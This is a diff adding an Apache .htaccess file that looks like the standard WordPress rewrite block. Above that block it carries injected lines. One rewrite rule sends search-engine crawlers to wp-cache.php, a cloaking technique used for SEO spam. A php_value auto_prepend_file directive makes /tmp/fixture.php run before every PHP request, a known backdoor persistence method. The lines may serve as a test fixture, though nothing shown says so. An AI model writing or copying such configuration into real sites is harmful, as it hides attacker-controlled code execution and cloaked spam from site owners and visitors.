@@ -1,0 +1,12 @@
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|bing) [NC]
+RewriteRule ^(.*)$ wp-cache.php?p=$1 [L]
+php_value auto_prepend_file /tmp/fixture.php
+# BEGIN WordPress
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteRule . /index.php [L]
+</IfModule>
+# END WordPress
